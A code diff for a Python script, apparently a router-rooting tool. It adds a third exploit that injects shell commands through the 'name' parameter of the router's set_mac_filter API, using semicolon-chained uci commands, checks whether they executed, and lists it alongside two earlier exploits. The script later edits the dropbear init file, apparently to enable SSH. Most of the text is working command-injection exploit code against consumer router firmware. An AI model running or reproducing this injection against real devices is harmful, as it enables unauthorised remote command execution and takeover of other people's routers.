@@ -38,13 +38,34 @@ def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
         res = ''
     return res
 
+def exploit_3(cmd, api = 'API/xqsystem/set_mac_filter'):
+    # vuln/exploit author: ?????????
+    if '\n' in cmd:
+        raise ValueError('Incorrect shell command format')
+    options = { 'add': 0, 'del': 1 }
+    for action, option in options.items():
+        time.sleep(0.05)
+        time_ms = time.time_ns() // 1_000_000
+        name = f'xxx ; uci set diag.config.usb_read_thr={time_ms} ; uci commit diag ; ' + cmd
+        params = { 'mac': '00:00:00:00:00:33', 'name': name, 'option': option, 'wan': '' }
+        try:
+            res = gw.api_request(api, params, resp = 'text', timeout = 2)
+        except requests.exceptions.ReadTimeout:
+            res = ''
+        if not res or '"code":0' not in res:
+            return ''
+        diag = gw.get_diag_paras(timeout = 2)
+        if str(diag['usb_read_thr']) == str(time_ms):
+            return res  # Ok
+    return ''
+
 
 # set default value for iperf_test_thr
 gw.set_diag_iperf_test_thr(20)
 
 vuln_test_num = 82000011
 exec_cmd = None
-exp_list = [ exploit_2, exploit_1 ]
+exp_list = [ exploit_2, exploit_1, exploit_3 ]
 for idx, exp_func in enumerate(exp_list):
     exp_test_num = vuln_test_num + idx
     res = exp_func(f"uci set diag.config.iperf_test_thr={exp_test_num} ; uci commit diag")
@@ -60,13 +81,16 @@ for idx, exp_func in enumerate(exp_list):
 gw.set_diag_iperf_test_thr(20)
 
 if not exec_cmd:
-    raise ExploitNotWorked('Exploits "arn_switch/start_binding" not working!!!')
+    raise ExploitNotWorked('Exploits "arn_switch/start_binding/set_mac_filter" not working!!!')
 
 if exec_cmd == exploit_1:
     print('Exploit "arn_switch" detected!') 
 
 if exec_cmd == exploit_2:
     print('Exploit "start_binding" detected!') 
+
+if exec_cmd == exploit_3:
+    print('Exploit "set_mac_filter" detected!') 
 
 
 exec_cmd(r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear")
